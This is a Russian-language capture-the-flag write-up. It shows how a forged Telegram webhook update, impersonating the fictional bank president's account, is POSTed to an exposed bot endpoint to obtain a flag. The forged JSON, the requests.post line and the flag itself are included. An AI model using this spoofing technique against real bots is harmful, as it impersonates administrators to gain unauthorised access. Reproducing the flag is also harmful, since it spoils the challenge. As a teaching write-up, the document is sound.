# Обман системы: Write-up

Вспоминаем про нашего бота [@bank_bank_bot](https://t.me/bank_bank_bot), заходим в него, видим команду `/flag`.

Однако, воспользоваться ей не получится:

```
Nikita Sychev, [23.02.19 01:09]
/flag

[bank Bank], [23.02.19 01:09]
Не указан telegram_id: /flag <telegram_id>

Nikita Sychev, [23.02.19 01:09]
/flag 123456

[bank Bank], [23.02.19 01:09]
Данная команда доступна только администрации ПАО «Финансовая Корпорация «Банк Банк Кредитные Системы»
```

Значит, нужно, чтобы эту команду выполнил кто-то из администрации Банка, причем с ID участника.

Заранее узнаем свой ID в Телеграме, например, с помощью ботов, веб-версии или кастомного клиента.

Вспоминаем решенный таск __DNS-сервера__ и вглядываемся в слитую зону. Как описано в таске __Исходные коды__, определяем, что на `https://botapi.bankbank.exposed` висит какой-то `CGIHTTPServer`. Однако, сейчас нам намного важнее не «исходники», а сам этот сервер.

Путем несложных манипуляций и логических эвристик определяем, что там крутится сервер для приёма обновлений ботом от Telegram методом [webhook](https://core.telegram.org/bots/api#setwebhook), причем рекомендации по безопасности (хранить URL в секрете) успешно игнорируются.

Что ж, отлично, сформируем фейковый запрос от Телеграма на отправку флага. Но кого мы укажем в качестве отправителя? Ответ очевиден — мы решили таск __CEO__ и узнали Telegram Президента Банка. Вот и всё.

Сформируем фейковое обновление:

```json
{
 "update_id": 0,
 "message": {
  "message_id": 0,
  "from": {
   "id": 617326093,
   "is_bot": false,
   "first_name": "Efrosinya",
   "last_name": "Puzakova",
   "username": "puzakova_the_gr347",
   "language_code": "en"
  },
  "chat": {
    "id": 617326093,
    "first_name": "Efrosinya",
    "last_name": "Puzakova",
    "username": "puzakova_the_gr347",
    "type": "private"
  },
  "date": 0,
  "text": "/flag TELEGRAM_ID"
 }
}
```

И отправим его:

```python
requests.post("https://botapi.bankbank.exposed", json=data)
```

Флаг: **uctf_webhookwebhook_exposed**
